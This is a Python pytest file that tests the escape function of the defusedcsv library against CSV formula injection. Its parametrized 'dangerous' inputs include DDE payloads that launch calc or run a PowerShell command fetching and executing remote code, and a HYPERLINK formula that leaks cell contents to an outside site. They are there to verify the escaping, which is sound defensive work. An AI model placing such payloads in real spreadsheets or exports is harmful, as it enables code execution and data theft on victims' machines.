import pytest
from defusedcsv.csv import escape


@pytest.mark.parametrize("input,expected", [
    # Sample dangerous payloads
    ("=1+1", "'=1+1"),
    ("-1+1", "'-1+1"),
    ("+1+1", "'+1+1"),
    ("=1+1", "'=1+1"),
    ("@A3", "'@A3"),
    ("%1", "'%1"),
    ("|1+1", "'\\|1+1"),
    ("=1|2", "'=1\\|2"),
    # https://blog.zsec.uk/csv-dangers-mitigations/
    ("=cmd|' /C calc'!A0", "'=cmd\\|' /C calc'!A0"),
    ("=cmd|' /C powershell IEX(wget 0r.pe/p)'!A0", "'=cmd\\|' /C powershell IEX(wget 0r.pe/p)'!A0"),
    ("@SUM(1+1)*cmd|' /C calc'!A0", "'@SUM(1+1)*cmd\\|' /C calc'!A0"),
    ("@SUM(1+1)*cmd|' /C powershell IEX(wget 0r.pe/p)'!A0", "'@SUM(1+1)*cmd\\|' /C powershell IEX(wget 0r.pe/p)'!A0"),
    # https://hackerone.com/reports/72785
    ("-2+3+cmd|' /C calc'!A0", "'-2+3+cmd\\|' /C calc'!A0"),
    # https://www.contextis.com/resources/blog/comma-separated-vulnerabilities/
    ('=HYPERLINK("http://contextis.co.uk?leak="&A1&A2,"Error: please click for further information")',
     '\'=HYPERLINK("http://contextis.co.uk?leak="&A1&A2,"Error: please click for further information")'),

])
def test_dangerous_sample_payloads(input, expected):
    assert escape(input) == expected


@pytest.mark.parametrize("input", [
    "1+2",
    "1",
    "Foo",
    "1.3",
    "1,2",
    "-1.3",
    "-1,2",
    "Foo Bar",
    "1-2",
    "1=3",
    "foo@example.org",
    "19.00 %",
    "Test | Foo",
    "",
    None,
    1,
    2,
    True
])
def test_safe_sample_payloads(input):
    assert escape(input) == (str(input) if input is not None else '')
